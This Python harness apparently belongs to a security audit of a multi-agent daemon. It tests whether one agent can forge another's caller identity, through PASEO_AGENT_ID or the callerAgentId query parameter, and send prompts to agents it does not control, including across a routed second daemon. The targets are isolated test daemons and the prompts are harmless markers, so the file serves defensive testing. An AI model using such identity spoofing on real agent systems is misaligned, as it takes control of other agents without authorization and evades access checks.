"""Question 2 stop-line: can an agent forge the caller identity to direct an
unrelated agent? Three live cases against the two isolated test daemons.

Actors (all are test agents on daemons this harness started):
  P  = acl-parent          (7801, top-level)
  B  = acl-child-of-P      (7801, child of P)             <- target, A did NOT start it
  A  = acl-independent-A   (7801, top-level, unrelated)   <- the forging caller
  RC = acl-remote-child-of-P (7802, child of P)           <- routed target

The forge: a shell whose real agent is A authenticates to the daemon with the
home's shared local credential (readable by any agent shell) and asserts a
different caller identity -- P's id -- via PASEO_AGENT_ID (CLI) or the
?callerAgentId= query parameter (/mcp/agents). No per-agent credential binds
either field to the requesting process.

Run with both test daemons up and the fixture present. Prints a JSONL log and a
summary table; also writes forge-evidence.jsonl.
"""
import json
import os
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

root = Path(sys.argv[1]).resolve()
assert root.parent == Path("/tmp") and root.name.startswith("paseo-acl-")
P, B, A, RC = (Path(f"/tmp/acl_{n}").read_text().strip() for n in ("P", "B", "A", "RC"))
DEST = (root / "7802/server-id").read_text().strip()
ORIGIN = (root / "7801/server-id").read_text().strip()
H1, H2 = root / "7801", root / "7802"
out = []


def emit(name, data):
    rec = {"observation": name, "data": data}
    out.append(rec)
    print(json.dumps(rec), flush=True)


# A's genuine shell environment, minus the identity we override.
def a_shell_env(forged_agent_id):
    env = dict(os.environ)
    for k in ("PASEO_AGENT_ID", "PASEO_WORKSPACE_ID", "PASEO_AGENT_CWD"):
        env.pop(k, None)
    env["PASEO_HOME"] = str(H1)
    env["PASEO_AGENT_ID"] = forged_agent_id  # the forge: A's shell claims P
    return env


def mcp_call(port, caller_agent_id, name, arguments):
    """Raw /mcp/agents JSON-RPC tools/call. No bearer token (daemon is
    passwordless, as a production daemon would still accept the shared
    capability token injected into every agent)."""
    url = f"http://127.0.0.1:{port}/mcp/agents?callerAgentId={caller_agent_id}"
    body = json.dumps({
        "jsonrpc": "2.0", "id": 1, "method": "tools/call",
        "params": {"name": name, "arguments": arguments},
    }).encode()
    req = urllib.request.Request(url, data=body, headers={
        "Content-Type": "application/json",
        "Accept": "application/json, text/event-stream",
    })
    with urllib.request.urlopen(req) as resp:
        raw = resp.read().decode()
    for line in raw.splitlines():
        if line.startswith("data: "):
            return json.loads(line[len("data: "):])
    return {"raw": raw}


# ---- Case 2: local CLI, A's shell claiming P, directs B (not A's child) ----
marker_cli = "ACL_FORGE_CLI"
env = a_shell_env(P)
emit("case2 cli invocation", {
    "real_caller_shell": f"agent A ({A})",
    "forged_PASEO_AGENT_ID": P,
    "target": f"B ({B}) child of P, unrelated to A",
    "command": f"paseo send --home {H1} --no-wait {B} 'Reply {marker_cli}_OK only. Use no tools.'",
})
try:
    r = subprocess.run(
        ["paseo", "send", "--home", str(H1), "--no-wait", B,
         f"Reply {marker_cli}_OK only. Use no tools."],
        env=env, capture_output=True, text=True, timeout=60)
    emit("case2 cli result", {"returncode": r.returncode,
                              "stdout": r.stdout.strip(), "stderr": r.stderr.strip()[:500]})
except Exception as e:  # noqa: BLE001
    emit("case2 cli result", {"error": repr(e)})

# ---- Case 3: local /mcp/agents, callerAgentId=P, directs B ----
marker_mcp = "ACL_FORGE_MCP"
emit("case3 mcp invocation", {
    "endpoint": f"POST /mcp/agents?callerAgentId={P} (no token)",
    "real_caller": f"local process acting for agent A ({A})",
    "forged_callerAgentId": P,
    "target": f"B ({B})",
})
try:
    resp = mcp_call(7801, P, "send_agent_prompt", {
        "agentId": B, "prompt": f"Reply {marker_mcp}_OK only. Use no tools.",
        "notifyOnFinish": False})
    emit("case3 mcp result", resp.get("result", resp))
except Exception as e:  # noqa: BLE001
    emit("case3 mcp result", {"error": repr(e)})

# ---- Case 4: connected host, callerAgentId=P, directs RC on 7802 ----
marker_routed = "ACL_FORGE_ROUTED"
emit("case4 routed invocation", {
    "endpoint": f"POST 7801/mcp/agents?callerAgentId={P} serverId={DEST}",
    "real_caller": f"local process acting for agent A ({A})",
    "forged_callerAgentId": P,
    "target": f"RC ({RC}) on 7802, child of P",
})
try:
    resp = mcp_call(7801, P, "send_agent_prompt", {
        "serverId": DEST, "agentId": RC,
        "prompt": f"Reply {marker_routed}_OK only. Use no tools.",
        "notifyOnFinish": False})
    emit("case4 routed result", resp.get("result", resp))
except Exception as e:  # noqa: BLE001
    emit("case4 routed result", {"error": repr(e)})

# ---- Settle, then read what each recipient's timeline recorded ----
print("# waiting 30s for delivery and recipient turns...", file=sys.stderr)
time.sleep(30)


def read_timeline(home, agent_id):
    items = json.loads(subprocess.check_output(
        ["paseo", "logs", agent_id, "--home", str(home), "--json"],
        env=dict(os.environ, PASEO_HOME=str(home)), text=True))["items"]
    msgs, replies = [], []
    for it in items:
        if m := it.get("agentMessage"):
            msgs.append({"messageId": it.get("callId"), "text": m.get("text"),
                         "sender": m.get("sender")})
        if it.get("type") == "assistant_message":
            replies.append(it["text"].strip())
    return msgs, replies


for label, home, target, marker in [
        ("B (7801) after case2+3", H1, B, [marker_cli, marker_mcp]),
        ("RC (7802) after case4", H2, RC, [marker_routed])]:
    msgs, replies = read_timeline(home, target)
    for m in msgs:
        if any(mk in (m["text"] or "") for mk in [marker_cli, marker_mcp, marker_routed]):
            emit(f"{label} received message", m)
    emit(f"{label} replies", replies)
